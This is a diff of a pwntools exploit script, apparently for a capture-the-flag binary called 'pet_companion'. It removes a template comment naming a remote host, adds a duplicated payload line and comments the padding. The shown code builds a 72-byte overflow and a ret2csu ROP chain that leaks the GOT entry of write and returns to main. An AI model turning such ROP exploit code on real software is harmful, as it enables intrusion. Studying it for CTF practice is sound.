@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template --host 94.237.50.221 --port 31099 --libc glibc/libc.so.6 ./pet_companion
 from pwn import *
 
 # Set up pwntools for the correct architecture
@@ -80,13 +78,17 @@ pop_rdi = 0x0000000000400743
 payload = b''
 payload += b'a'*72
 
+payload = b''
+payload += b'a'*72
+
 payload += p64(gadget_1)
 payload += p64(0) #rbx
 payload += p64(1) #rbp
 payload += p64(exe.got.write) #r12
 payload += p64(1) + p64(exe.got.write) + p64(8) # r13, r14, r15 -> rdi, rsi, rdx
 payload += p64(gadget_2)
-payload += p64(0) * 7 + p64(exe.sym.main)
+payload += p64(0) * 7 #padding
+payload += p64(exe.sym.main) # return to main
 
 io.recvuntil(b'status:')
 io.sendline(payload)
